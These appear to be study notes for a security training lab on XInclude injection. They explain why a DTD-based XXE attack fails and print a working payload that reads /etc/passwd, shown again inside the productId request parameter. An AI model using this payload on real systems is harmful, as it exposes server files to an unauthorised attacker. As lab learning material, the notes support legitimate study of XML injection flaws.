Title: Exploiting XInclude to retrieve files
Level: Practitioner
Desc: This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
To solve the lab, **inject an XInclude statement** to retrieve the contents of the /etc/passwd file. 

you don't control entire XML document -> you can't add or edit DOCTYPE element -> try Xinclude

Xinclude gives possibility to build XML document from sub-documents.

You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document. 

example of payload: 
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

paylad: 
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

payload in use:
```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
